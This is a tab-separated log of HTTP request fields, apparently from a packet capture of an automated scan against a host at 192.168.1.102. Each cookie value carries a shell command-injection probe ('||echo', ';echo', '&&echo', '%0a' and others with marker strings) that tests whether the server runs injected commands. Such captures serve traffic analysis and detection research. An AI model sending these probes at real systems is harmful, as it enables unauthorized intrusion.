http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			||echo TQRUBY$((58+1))$(echo TQRUBY)TQRUBY&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			||echo TQRUBY$((58+1))$(echo TQRUBY)TQRUBY&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			||echo TQRUBY$((58+1))$(echo TQRUBY)TQRUBY&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			||echo TQRUBY$((58+1))$(echo TQRUBY)TQRUBY&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			%0aecho QVSKGX$((97+5))$(echo QVSKGX)QVSKGX&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			%0aecho QVSKGX$((97+5))$(echo QVSKGX)QVSKGX&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			%0aecho QVSKGX$((97+5))$(echo QVSKGX)QVSKGX&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			%0aecho QVSKGX$((97+5))$(echo QVSKGX)QVSKGX&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			%0aecho QVSKGX$((97+5))$(echo QVSKGX)QVSKGX&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			%0aecho QVSKGX$((97+5))$(echo QVSKGX)QVSKGX&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			%0aecho QVSKGX$((97+5))$(echo QVSKGX)QVSKGX&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			%0aecho QVSKGX$((97+5))$(echo QVSKGX)QVSKGX&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			%0d%0aecho UPIWSQ$((12+21))$(echo UPIWSQ)UPIWSQ&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			%0d%0aecho UPIWSQ$((12+21))$(echo UPIWSQ)UPIWSQ&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			%0d%0aecho UPIWSQ$((12+21))$(echo UPIWSQ)UPIWSQ&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			%0d%0aecho UPIWSQ$((12+21))$(echo UPIWSQ)UPIWSQ&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			%0d%0aecho UPIWSQ$((12+21))$(echo UPIWSQ)UPIWSQ&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			%0d%0aecho UPIWSQ$((12+21))$(echo UPIWSQ)UPIWSQ&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			%0d%0aecho UPIWSQ$((12+21))$(echo UPIWSQ)UPIWSQ&'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			%0d%0aecho UPIWSQ$((12+21))$(echo UPIWSQ)UPIWSQ&'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			echo BBVUOD$((20+39))$(echo BBVUOD)BBVUOD'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			echo BBVUOD$((20+39))$(echo BBVUOD)BBVUOD'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			echo BBVUOD$((20+39))$(echo BBVUOD)BBVUOD'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			echo BBVUOD$((20+39))$(echo BBVUOD)BBVUOD'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			echo BBVUOD$((20+39))$(echo BBVUOD)BBVUOD'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			echo BBVUOD$((20+39))$(echo BBVUOD)BBVUOD'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			echo BBVUOD$((20+39))$(echo BBVUOD)BBVUOD'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			echo BBVUOD$((20+39))$(echo BBVUOD)BBVUOD'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			;echo NLQPIS$((73+90))$(echo NLQPIS)NLQPIS'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			;echo NLQPIS$((73+90))$(echo NLQPIS)NLQPIS'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			;echo NLQPIS$((73+90))$(echo NLQPIS)NLQPIS'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			;echo NLQPIS$((73+90))$(echo NLQPIS)NLQPIS'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			;echo NLQPIS$((73+90))$(echo NLQPIS)NLQPIS'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			;echo NLQPIS$((73+90))$(echo NLQPIS)NLQPIS'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			;echo NLQPIS$((73+90))$(echo NLQPIS)NLQPIS'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			;echo NLQPIS$((73+90))$(echo NLQPIS)NLQPIS'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			;echo UADIOJ$((3+86))$(echo UADIOJ)UADIOJ'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			;echo UADIOJ$((3+86))$(echo UADIOJ)UADIOJ'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			;echo UADIOJ$((3+86))$(echo UADIOJ)UADIOJ'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			;echo UADIOJ$((3+86))$(echo UADIOJ)UADIOJ'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			;echo UADIOJ$((3+86))$(echo UADIOJ)UADIOJ'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			;echo UADIOJ$((3+86))$(echo UADIOJ)UADIOJ'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			;echo UADIOJ$((3+86))$(echo UADIOJ)UADIOJ'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			;echo UADIOJ$((3+86))$(echo UADIOJ)UADIOJ'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			&echo RWGDDH$((61+34))$(echo RWGDDH)RWGDDH'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			&echo RWGDDH$((61+34))$(echo RWGDDH)RWGDDH'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			&echo RWGDDH$((61+34))$(echo RWGDDH)RWGDDH'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			&echo RWGDDH$((61+34))$(echo RWGDDH)RWGDDH'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			&echo RWGDDH$((61+34))$(echo RWGDDH)RWGDDH'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			&echo RWGDDH$((61+34))$(echo RWGDDH)RWGDDH'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			&echo RWGDDH$((61+34))$(echo RWGDDH)RWGDDH'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			&echo RWGDDH$((61+34))$(echo RWGDDH)RWGDDH'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			&echo AXTUSC$((92+31))$(echo AXTUSC)AXTUSC'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			&echo AXTUSC$((92+31))$(echo AXTUSC)AXTUSC'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			&echo AXTUSC$((92+31))$(echo AXTUSC)AXTUSC'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			&echo AXTUSC$((92+31))$(echo AXTUSC)AXTUSC'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			&echo AXTUSC$((92+31))$(echo AXTUSC)AXTUSC'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			&echo AXTUSC$((92+31))$(echo AXTUSC)AXTUSC'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			&echo AXTUSC$((92+31))$(echo AXTUSC)AXTUSC'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			&echo AXTUSC$((92+31))$(echo AXTUSC)AXTUSC'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			echo ZPWYCY$((8+69))$(echo ZPWYCY)ZPWYCY'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			echo ZPWYCY$((8+69))$(echo ZPWYCY)ZPWYCY'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			echo ZPWYCY$((8+69))$(echo ZPWYCY)ZPWYCY'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			echo ZPWYCY$((8+69))$(echo ZPWYCY)ZPWYCY'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			&&echo BLYXIZ$((61+90))$(echo BLYXIZ)BLYXIZ'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			&&echo BLYXIZ$((61+90))$(echo BLYXIZ)BLYXIZ'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			&&echo BLYXIZ$((61+90))$(echo BLYXIZ)BLYXIZ'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			&&echo BLYXIZ$((61+90))$(echo BLYXIZ)BLYXIZ'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			&&echo BLYXIZ$((61+90))$(echo BLYXIZ)BLYXIZ'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			&&echo BLYXIZ$((61+90))$(echo BLYXIZ)BLYXIZ'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			&&echo BLYXIZ$((61+90))$(echo BLYXIZ)BLYXIZ'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			&&echo BLYXIZ$((61+90))$(echo BLYXIZ)BLYXIZ'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			&&echo BNQPIV$((30+86))$(echo BNQPIV)BNQPIV'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			&&echo BNQPIV$((30+86))$(echo BNQPIV)BNQPIV'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			&&echo BNQPIV$((30+86))$(echo BNQPIV)BNQPIV'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			&&echo BNQPIV$((30+86))$(echo BNQPIV)BNQPIV'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			&&echo BNQPIV$((30+86))$(echo BNQPIV)BNQPIV'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			&&echo BNQPIV$((30+86))$(echo BNQPIV)BNQPIV'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			&&echo BNQPIV$((30+86))$(echo BNQPIV)BNQPIV'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			&&echo BNQPIV$((30+86))$(echo BNQPIV)BNQPIV'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			|echo AKECAY$((14+10))$(echo AKECAY)AKECAY'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web		GET				HTTP/1.1																			|echo AKECAY$((14+10))$(echo AKECAY)AKECAY'				/web
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			|echo AKECAY$((14+10))$(echo AKECAY)AKECAY'				/web/
*/*	gzip, deflate																close										192.168.1.102															1	http://192.168.1.102/web/		GET				HTTP/1.1																			|echo AKECAY$((14+10))$(echo AKECAY)AKECAY'				/web/
